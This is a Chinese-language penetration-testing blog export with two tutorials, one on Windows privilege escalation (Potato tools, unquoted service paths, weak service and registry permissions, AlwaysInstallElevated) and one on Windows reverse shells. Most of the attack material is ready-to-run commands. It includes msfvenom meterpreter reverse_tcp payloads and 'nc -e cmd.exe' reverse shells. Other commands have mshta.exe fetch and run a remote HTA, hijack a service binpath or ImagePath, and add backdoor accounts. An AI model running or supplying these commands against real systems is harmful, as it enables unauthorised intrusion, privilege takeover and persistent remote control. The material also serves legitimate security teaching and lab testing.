<h6 id="privilege-escalation-awesome-scripts：winPEAS-bat"><a href="#privilege-escalation-awesome-scripts：winPEAS-bat" class="headerlink" title="privilege-escalation-awesome-scripts：winPEAS.bat"></a>privilege-escalation-awesome-scripts：winPEAS.bat</h6><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/carlospolop/</span>privilege-escalation-awesome-scriptssuite<span class="regexp">/blob/m</span>aster<span class="regexp">/winPEAS/</span>winPEASbat/winPEAS.bat</span><br></pre></td></tr></table></figure>



<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/M4ximuss/</span>Powerless</span><br></pre></td></tr></table></figure>



<h5 id="提权工具脚本"><a href="#提权工具脚本" class="headerlink" title="提权工具脚本"></a>提权工具脚本</h5><h6 id="RottenPotato：-将服务帐户本地提权至SYSTEM"><a href="#RottenPotato：-将服务帐户本地提权至SYSTEM" class="headerlink" title="RottenPotato： 将服务帐户本地提权至SYSTEM"></a>RottenPotato： 将服务帐户本地提权至SYSTEM</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">load incognito</span><br><span class="line">list_token –u</span><br><span class="line">upload /root/rottenpotato.exe .</span><br><span class="line">execute <span class="literal">-Hc</span> <span class="operator">-f</span> rottenpotato.exe</span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\\SYSTEM&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/5.png">)</p>
<p>基于RottenPotato二次开发的软件：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">Origin Potato : https:<span class="regexp">//gi</span>thub.com<span class="regexp">/foxglovesec/</span>Potato </span><br><span class="line"></span><br><span class="line">RottenPotato &amp; JuicyPotato: https:<span class="regexp">//gi</span>thub.com<span class="regexp">/ohpe/</span>juicy-potato </span><br><span class="line"></span><br><span class="line">RoguePotato: https:<span class="regexp">//gi</span>thub.com<span class="regexp">/antonioCoco/</span>RoguePotato </span><br><span class="line"></span><br><span class="line">SweetPotato: https:<span class="regexp">//gi</span>thub.com<span class="regexp">/CCob/</span>SweetPotato</span><br></pre></td></tr></table></figure>

<h6 id="SweetPotato"><a href="#SweetPotato" class="headerlink" title="SweetPotato"></a>SweetPotato</h6><p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/6.png"></p>
<h6 id="Getsystem"><a href="#Getsystem" class="headerlink" title="Getsystem"></a>Getsystem</h6><p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/7.png"></p>
<h3 id="0x02-Windows内核漏洞提权"><a href="#0x02-Windows内核漏洞提权" class="headerlink" title="0x02 Windows内核漏洞提权"></a>0x02 Windows内核漏洞提权</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#检查Windows版本是否有任何已知的漏洞：</span></span><br><span class="line">systeminfo | findstr /B /C:<span class="string">&quot;OS Name&quot;</span> /C:<span class="string">&quot;OS Version“</span></span><br><span class="line"><span class="string">wmic qfe get Caption,Description,HotFixID,InstalledOn</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#列出所有补丁：</span></span><br><span class="line"><span class="string">powershell -c &quot;</span><span class="built_in">Get-WmiObject</span> <span class="literal">-query</span> <span class="string">&#x27;select * from win32_quickfixengineering&#x27;</span> | <span class="keyword">foreach</span> &#123;<span class="variable">$_</span>.hotfixid&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#列出安全更新补丁：</span></span><br><span class="line"><span class="string">powershell -c &quot;</span><span class="built_in">Get-Hotfix</span> <span class="literal">-description</span> <span class="string">&#x27;Security update&#x27;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<h6 id="windows-kernel-exploits-Windows平台提权漏洞集合"><a href="#windows-kernel-exploits-Windows平台提权漏洞集合" class="headerlink" title="windows-kernel-exploits(Windows平台提权漏洞集合):"></a>windows-kernel-exploits(Windows平台提权漏洞集合):</h6><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/SecWiki/</span>windows-kernel-exploits</span><br></pre></td></tr></table></figure>

<h6 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line"><span class="built_in">set</span> SESSION </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/8.png"></p>
<h4 id="0x03-Windows系统服务漏洞"><a href="#0x03-Windows系统服务漏洞" class="headerlink" title="0x03  Windows系统服务漏洞"></a>0x03  Windows系统服务漏洞</h4><h5 id="可信任服务路径"><a href="#可信任服务路径" class="headerlink" title="可信任服务路径"></a>可信任服务路径</h5><p>可信任服务路径：存在缺陷的服务程序利用属于可执行文件的文件/文件夹权限， Windows服务通常都是以System权限运行的，所以系统在解析服务的二进制文件对应的文件路径中的空格的时候 也会以系统权限进行解析。如果我们能利用这一特性，就有机会进行权限提升。</p>
<p>例如：</p>
<p>C:\Program Files (x86)\Windows Folder\Common Folder\Folder.exe </p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">C:<span class="string">\Program.exe</span> </span><br><span class="line"></span><br><span class="line">C:<span class="string">\Program</span> Files (x86)<span class="string">\Windows.exe</span> </span><br><span class="line"></span><br><span class="line">C:<span class="string">\Program</span> Files (x86)<span class="string">\Windows</span> Folder<span class="string">\Common.exe</span> </span><br><span class="line"></span><br><span class="line">C:<span class="string">\Program</span> Files (x86)<span class="string">\Windows</span> Folder<span class="string">\Common</span> Folder<span class="string">\Folder.exe</span></span><br></pre></td></tr></table></figure>

<p>Windows在寻找这个文件的时候，碰见空格会先找寻Program.exe这个文件，如果当前文件下没有Program.exe，则会继续向下走到第二个目录，碰见空格，又执行Windows.exe，以此类推，知道执行到Folder.exe。</p>
<p>所以，我们可以通过查找系统服务文件中存在的非引用路径，如果一个服务调用可执行文件，没有正确处理引用的全路径名， 则可利用此漏洞。</p>
<ol>
<li><h6 id="检查目标主机是否可能存在漏洞："><a href="#检查目标主机是否可能存在漏洞：" class="headerlink" title="检查目标主机是否可能存在漏洞："></a>检查目标主机是否可能存在漏洞：</h6></li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode|findstr /i <span class="string">&quot;Auto&quot;</span> |findstr /i /v <span class="string">&quot;C:\Windows\\&quot;</span></span><br><span class="line">|findstr/i /v <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/9.png"></p>
<ol start="2">
<li><h6 id="检查对有漏洞目录是否有写入权限"><a href="#检查对有漏洞目录是否有写入权限" class="headerlink" title="检查对有漏洞目录是否有写入权限"></a>检查对有漏洞目录是否有写入权限</h6></li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">icacls <span class="string">&quot;C:\Program Files (x86)\Program Folder&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>F = 完全控制 </p>
<p>CI = 容器继承 - 此标志指示从属容器将继承此ACE。 </p>
<p>OI = Object Inherit - 这个标志表示从属文件将继承ACE</p>
</blockquote>
<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/10.png"></p>
<ol start="3">
<li><h6 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h6></li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">9999</span> <span class="operator">-f</span> exe <span class="literal">-o</span> A.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/11.png"></p>
<ol start="4">
<li><h6 id="上传exe到漏洞目录"><a href="#上传exe到漏洞目录" class="headerlink" title="上传exe到漏洞目录"></a>上传exe到漏洞目录</h6></li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">upload A.exe “C:\Program Files (x86)\Program Folder\<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/12.png"></p>
<ol start="5">
<li><h6 id="开启监听"><a href="#开启监听" class="headerlink" title="开启监听"></a>开启监听</h6></li>
</ol>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">handler</span> -H <span class="number">192.168.31.246</span> -P <span class="number">9999</span> -p windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>

<ol start="6">
<li><h6 id="重启服务"><a href="#重启服务" class="headerlink" title="重启服务"></a>重启服务</h6></li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sc</span> stop <span class="string">&quot;Vulnerable Service”</span></span><br><span class="line"><span class="string">sc start &quot;</span>Vulnerable Service</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/13.png"></p>
<ol start="7">
<li><h6 id="设置自动迁移进程，重新开启监听，获取meterpreter"><a href="#设置自动迁移进程，重新开启监听，获取meterpreter" class="headerlink" title="设置自动迁移进程，重新开启监听，获取meterpreter"></a>设置自动迁移进程，重新开启监听，获取meterpreter</h6></li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lport <span class="number">9999</span></span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line"><span class="built_in">set</span> autorunscript migrate –f</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/14.png"></p>
<h5 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h5><p>Windows系统服务文件在操作系统启动时会加载执行，并且在后台调用可执行文件。</p>
<p>JAVA升级程序，每次重启系统时，JAVA升级程序会检测Oracle网站，是否有新版JAVA程序。 而类似JAVA程序之类的系统服务程序加载时往往都是运行在系统权限上的。</p>
<p>所以如果一个低权限的用户对于此类 系统服务调用的可执行文件具有可写的权限，那么就可以修改服务的属性，将其替换成我们的恶意可执行文件，从 而随着系统启动服务而获得系统权限。</p>
<ol>
<li><h6 id="利用accesschk工具检查易受到攻击的服务"><a href="#利用accesschk工具检查易受到攻击的服务" class="headerlink" title="利用accesschk工具检查易受到攻击的服务"></a>利用accesschk工具检查易受到攻击的服务</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">accesschk64.exe <span class="literal">-ucqv</span> “LYXC<span class="string">&quot; * /accepteula</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/15.png"></p>
</li>
<li><h6 id="查看可完全控制的服务的属性"><a href="#查看可完全控制的服务的属性" class="headerlink" title=".查看可完全控制的服务的属性"></a>.查看可完全控制的服务的属性</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sc</span> qc <span class="string">&quot;Vulnerable Service&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/16.png"></p>
</li>
<li><h6 id="修改服务配置执行命令binpath"><a href="#修改服务配置执行命令binpath" class="headerlink" title="修改服务配置执行命令binpath"></a>修改服务配置执行命令binpath</h6><p>BINARY_PATH_NAME参数指向了该服务的可执行程序(Executable.exe)路径。如果我们将这个值修改成任何命令， 那意味着这个命令在该服务下一次启动时，将会以SYSTEM权限运行</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sc</span> config <span class="string">&quot;Vulnerable Service&quot;</span> binpath= <span class="string">&quot;net user zhangsan 123456 /add&quot;</span></span><br><span class="line"><span class="built_in">sc</span> stop <span class="string">&quot;Vulnerable Service&quot;</span></span><br><span class="line"><span class="built_in">sc</span> <span class="built_in">start</span> <span class="string">&quot;Vulnerable Service&quot;</span> </span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/17.png"></p>
<blockquote>
<p>Authenticated Users：指Windows系统中所有使用用户名、密码登录并通过身份验证的账户，不包括来宾账户 Guest。也可以使用当前用户用户名来列出所有可以被当前用户修改的服务。 </p>
<p>SERVICE_ALL_ACCESS：意思是我们对 Vulnerable Service 的属性拥有完全控制权 </p>
<p>BINARY_PATH_NAME：参数指向了该服务的可执行程序路径。如果我们将这个值修改成任何命令，那意味着这个 命令在该服务下一次启动时，将会以SYSTEM权限运行。</p>
</blockquote>
</li>
</ol>
<h5 id="不安全的注册表权限"><a href="#不安全的注册表权限" class="headerlink" title="不安全的注册表权限"></a>不安全的注册表权限</h5><p>Windows中,与服务相关的信息存在 <code>HKLM[HKEY_LOCAL_MACHINE]\SYSTEM\CurrentControlSet\Services</code> 注册表中。 如果想查看有关 “易受攻击的服务”的信息，应该检查 <code>HKLM\SYSTEM\ControlSet\Services\Vulnerable Service</code> 的键值。</p>
<h6 id="工具：-Subinacl"><a href="#工具：-Subinacl" class="headerlink" title="工具： Subinacl"></a>工具： Subinacl</h6><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.microsoft.com<span class="regexp">/en-us/</span>download/details.aspx?id=<span class="number">23510</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">subinacl.exe /keyreg <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service&quot;</span> /display</span><br></pre></td></tr></table></figure>

<p>如果对注册表项有写入权限，我们可以通过编辑ImagePath值来更改此服务的可执行路径。</p>
<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/18.png"></p>
<ol>
<li><h6 id="msfvenom生成木马"><a href="#msfvenom生成木马" class="headerlink" title="msfvenom生成木马"></a>msfvenom生成木马</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/adduser USER=hacker PASS=Hacker123<span class="variable">$</span> <span class="operator">-f</span> exe &gt; adduser.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/19.png"></p>
</li>
<li><h6 id="上传到机器上"><a href="#上传到机器上" class="headerlink" title="上传到机器上"></a>上传到机器上</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">upload adduser.exe C:\\Windows\\Temp\\</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/20.png"></p>
</li>
<li><h6 id="执行修改命令"><a href="#执行修改命令" class="headerlink" title="执行修改命令"></a>执行修改命令</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service&quot;</span> /t REG_EXPAND_SZ /v ImagePath /d <span class="string">&quot;C:\Windows\Temp\adduser.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>

<p>注册表被成功替换</p>
<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/21.png"></p>
</li>
<li><h6 id="重新启动服务，用户被成功添加"><a href="#重新启动服务，用户被成功添加" class="headerlink" title="重新启动服务，用户被成功添加"></a>重新启动服务，用户被成功添加</h6><p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/22.png"></p>
</li>
</ol>
<h5 id="不安全的文件-文件夹权限"><a href="#不安全的文件-文件夹权限" class="headerlink" title="不安全的文件/文件夹权限"></a>不安全的文件/文件夹权限</h5><p>这与我们用非引用服务路径所做的非常相似。无引号的服务路径利用了“CreateProcess”功能的弱点，以及服务 的可执行文件路径的文件夹权限。 </p>
<p>在这里可以直接替换可执行文件。 </p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">icacls <span class="string">&quot;C:\Program Files (x86)\Program Folder&quot;</span></span><br></pre></td></tr></table></figure>

<p> 默认的服务文件是C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe 将“Executable.exe”文件替换成一个反弹shell payload，并且当服务重启时，会反弹一个SYSTEM权限的 meterpreter 会话</p>
<h5 id="Always-Install-Elevated"><a href="#Always-Install-Elevated" class="headerlink" title="Always Install Elevated"></a>Always Install Elevated</h5><p>任意用户以NT AUTHORITY\SYSTEM权限安装msi。</p>
<p>AlwaysInstallElevated是一个策略设置，当在系统中使用Windows Installer安装任何程序时，该参数允许非特权 用户以system权限运行MSI文件。如果目标系统上启用了这一设置，我们可以使用msf生成msi文件来以system权 限执行任意payload。</p>
<h6 id="判断是否启用此策略设置："><a href="#判断是否启用此策略设置：" class="headerlink" title="判断是否启用此策略设置："></a>判断是否启用此策略设置：</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line"></span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer /v</span><br><span class="line">AlwaysInstallElevated</span><br></pre></td></tr></table></figure>

<p>收到“错误：系统无法找到指定的注册表项或值”的错误，则表示此注册表值从未创建。 说明政策没有启用。 </p>
<p>收到“AlwaysInstallElevated REG_DWORD 0x1”，说明策略已经启用。</p>
<h6 id="启用Always-Install-Elevated"><a href="#启用Always-Install-Elevated" class="headerlink" title="启用Always Install Elevated:"></a>启用Always Install Elevated:</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d <span class="number">1</span> </span><br><span class="line">reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t</span><br><span class="line">REG_DWORD /d <span class="number">1</span></span><br></pre></td></tr></table></figure>

<ol>
<li><h6 id="使用msfvenom生成恶意msi程序上传"><a href="#使用msfvenom生成恶意msi程序上传" class="headerlink" title="使用msfvenom生成恶意msi程序上传"></a>使用msfvenom生成恶意msi程序上传</h6></li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">8881</span> <span class="operator">-f</span> exe <span class="literal">-o</span> localmsf8881.exe</span><br><span class="line"></span><br><span class="line"><span class="comment">#反弹shell</span></span><br><span class="line">msfvenom <span class="operator">-f</span> msi<span class="literal">-nouac</span> <span class="literal">-p</span> windows/exec cmd=<span class="string">&quot;C:\Users\LYXC\AppData\Local\Temp\localmsf8882.exe&quot;</span> &gt; malicious.msi</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加用户</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/adduser USER=test PASS=Password@<span class="number">123</span> -<span class="literal">-platform</span> windows <span class="literal">-a</span> x86 <span class="operator">-f</span> msinouac <span class="literal">-o</span> test.msi</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/23.png"></p>
<ol start="2">
<li><h6 id="将这两个上传到目标机器"><a href="#将这两个上传到目标机器" class="headerlink" title="将这两个上传到目标机器"></a>将这两个上传到目标机器</h6></li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; upload localmsf8881.exe C:\\Users\\LYXC\\AppData\\Local\\Temp\\</span><br><span class="line">meterpreter &gt; upload malicious.msi C:\\Users\\LYXC\\AppData\\Local\\Temp\\</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/24.png"></p>
<ol start="3">
<li><h6 id="运行恶意程序"><a href="#运行恶意程序" class="headerlink" title="运行恶意程序"></a>运行恶意程序</h6></li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msiexec /quiet /qn /i C:\Users\LYXC\AppData\Local\temp\malicious.msi</span><br><span class="line"></span><br><span class="line"><span class="comment"># /quiet 安装过程中禁止向用户发送消息</span></span><br><span class="line"><span class="comment"># /qn 不使用GUI</span></span><br><span class="line"><span class="comment"># /i 安装程序</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/25.png"></p>
<p>直接收到了第二个session</p>
<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/26.png"></p>
<p>但是权限依然只是LYXC，并不是System的最高权限，是因为Metasploit生成的msi文件 在运行时没有要求提升权限，所以导致了这个问题，这时可以使用微软官方的MSI生成工具</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">https</span>://www.exemsi.com/downloads/msi_wrapper/MSI_Wrapper_<span class="number">9</span>_<span class="number">0</span>_<span class="number">42</span>_<span class="number">0</span>.msi</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/27.png"></p>
<p>上传malicious.msi至靶机，运行恶意程序</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msiexec /quiet /qn /i C:\Users\anthus\AppData\Local\temp\malicious.msi</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/28.png"></p>
<p>成功提权</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Window反弹Shell</title>
    <url>/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/</url>
    <content><![CDATA[<h1 id="Window反弹SHELL"><a href="#Window反弹SHELL" class="headerlink" title="Window反弹SHELL"></a>Window反弹SHELL</h1><h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-反弹SHELL简介"><a href="#0x00-反弹SHELL简介" class="headerlink" title="0x00  反弹SHELL简介"></a>0x00  反弹SHELL简介</h3><h6 id="什么是反弹shell（reverse-shell）？"><a href="#什么是反弹shell（reverse-shell）？" class="headerlink" title="什么是反弹shell（reverse shell）？"></a>什么是反弹shell（reverse shell）？</h6><p>就是控制端监听某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
<h6 id="为什么需要反弹shell？"><a href="#为什么需要反弹shell？" class="headerlink" title="为什么需要反弹shell？"></a>为什么需要反弹shell？</h6><p>反弹shell通常用于被控端因防火墙受限、权限不足、端口被占用等情形。在渗透过程中，往往因为端口限制而无法直连目标机器，此时需要通过反弹shell来获取一个交互式shell，以便继续深入。</p>
<blockquote>
<p>正向shell：控制端主动发起连接请求去连接被控制端，中间网络链路不存在阻碍。</p>
<p>反向Shell（反弹Shell）：被控端主动发起连接请求去连接控制端，通常被控端由于防火墙限制、权限不足、端 口被占用等问题导致被控端不能正常接收发送过来的数据包。</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01-Windows反弹Shell"><a href="#0x01-Windows反弹Shell" class="headerlink" title="0x01 Windows反弹Shell"></a>0x01 Windows反弹Shell</h3><h4 id="NetCat（NC）"><a href="#NetCat（NC）" class="headerlink" title="NetCat（NC）"></a>NetCat（NC）</h4><h6 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端</span></span><br><span class="line">nc <span class="literal">-lvvp</span> <span class="number">8888</span> <span class="literal">-e</span> cmd.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/1.png"></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">nc <span class="number">192.168</span>.<span class="number">31.198</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/2.png"></p>
<h6 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端</span></span><br><span class="line">nc <span class="literal">-e</span> cmd.exe <span class="number">192.168</span>.<span class="number">31.246</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/3.png"></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">nc <span class="literal">-lvvp</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/4.png"></p>
<h4 id="mshta-exe"><a href="#mshta-exe" class="headerlink" title="mshta.exe"></a>mshta.exe</h4><p>mshta.exe是用于负责解释运行HTA(HTML应用程序)文件的Windows系统应用程序。可以运行JavaScript或 VBScript的HTML文件。</p>
<h6 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">use exploit/windows/misc/hta_server</span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> srvhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> lhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> lport <span class="number">7777</span></span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> target <span class="number">1</span></span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; exploit –j</span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">mshta.exe http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8080</span>/jmTzAZDOdeGOUV.hta</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/5.png"></p>
<blockquote>
<p>Tips:</p>
<p>在VPS上使用hta_server模块设置lhost时可能会出现无法接收到shelll的问题，是因为VPS主机内部全部采用私有IP地址（如192.68.0.X)，通过一个公共的IP地址与外界进行通信。</p>
<p>需要设置reverselistenerbindaddress 选项，绑定到本地系统上的特定IP地址</p>
</blockquote>
<h6 id><a href="#" class="headerlink" title></a></h6><h6 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom"></a>Msfvenom</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">7777</span> <span class="operator">-f</span> hta<span class="literal">-psh</span> <span class="literal">-o</span> <span class="number">1</span>.hta</span><br><span class="line">python –m SimpleHTTPServer <span class="number">8000</span></span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">7777</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">mshta.exe http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8000</span>/<span class="number">1</span>.hta</span><br></pre></td></tr></table></figure>

<h6 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h6><ol>
<li>生成hta</li>
</ol>
<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/6.png"></p>
<ol start="2">
<li><p>生成恶意站点</p>
<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/7.png"></p>
</li>
</ol>
<h4 id="rundll32-exe"><a href="#rundll32-exe" class="headerlink" title="rundll32.exe"></a>rundll32.exe</h4><p>Rundll32.exe与Windows操作系统相关，它允许调用从DLL导出的函数(16位或32位)，并将其存储在适当的内存 库中。 动态链接库英文为DLL (Dynamic Link Library) 。DLL是一个包含可由多个程序，同时使用的代码和数据的库。</p>
